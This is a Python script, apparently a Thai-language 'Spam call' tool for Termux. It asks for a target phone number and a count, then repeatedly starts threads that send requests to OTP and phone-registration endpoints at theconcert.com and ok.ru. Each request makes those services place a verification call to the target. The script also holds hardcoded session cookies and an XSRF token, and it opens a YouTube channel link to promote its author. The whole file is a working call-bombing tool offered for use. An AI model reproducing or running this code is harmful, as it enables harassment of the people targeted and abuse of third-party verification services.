import requests,json
import random
import pyfiglet
import os
import time
import threading
from requests import get
from re import search
from bs4 import BeautifulSoup as bs
import requests as ru
from requests import Session
os.system("clear")
print("\33[1;93mฟากช่อง YT :0")
time.sleep(1)
print("\33[1;00mติดตามซะะะะะ \33[1;91m!!!!!")
time.sleep(1)
os.system("termux-open-url https://youtube.com/channel/UCxVaet-GayhVwY44j97f0ng")
time.sleep(1)
os.system("clear")
time.sleep(1)


ascii_banner = pyfiglet.figlet_format("Spam call")

def banner():
	print(f"\33[1;93m{ascii_banner}") 
	print("\33[1;91m>Call delay for 30-300sec `~`")
	print("\33[1;93m>Cradit YT : Test01")    
	print("\33[1;92m>ไปกดติดตามด้วยนาจา")
	print("")
	
	
banner()

phone = input("\033[1;92m[+] \033[1;91mTarget\33[1;00m :\033[1;92m ")
num = int(input("\033[1;92m[+] \033[1;91mNumber\33[1;00m : \033[1;92m"))
print("")
print("\033[1;92m[\33[1;96m-                   \033[1;92m]\033[1;92m1% ")
time.sleep(1)
print("\033[1;92m[\33[\33[1;92m----                \033[1;92m]\033[1;92m25%")
time.sleep(1)
print("\033[1;92m[\33[1;93m----------          \033[1;92m]\033[1;92m50%")
time.sleep(1)
print("\033[1;92m[\33[1;94m---------------     \033[1;92m]\033[1;92m75%")
time.sleep(1)
print("\033[1;92m[\33[1;96m--------------------\033[1;92m]\033[1;92m100%")
time.sleep(1)
print(f"\33[1;92m____________________________________\33[1;91m-Start-\33[1;92m____________________________________")

def zero():
	requests.post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
	print("\033[1;92m[+] \033[1;95mtheconcert call \033[1;91mทำงาน !")

def api0():
    send = Session()
    send.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
    snd = send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
    sed = send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
    if 'error' in snd.text or sed.text:
    	print("\033[1;92m[+] \033[1;95mAnonymous Call \033[1;91mทำงาน !")
    else:
    	print("")

	
for i in range(num):
	threading.Thread(target=zero).start()
	time.sleep(1)
	threading.Thread(target=api0).start()

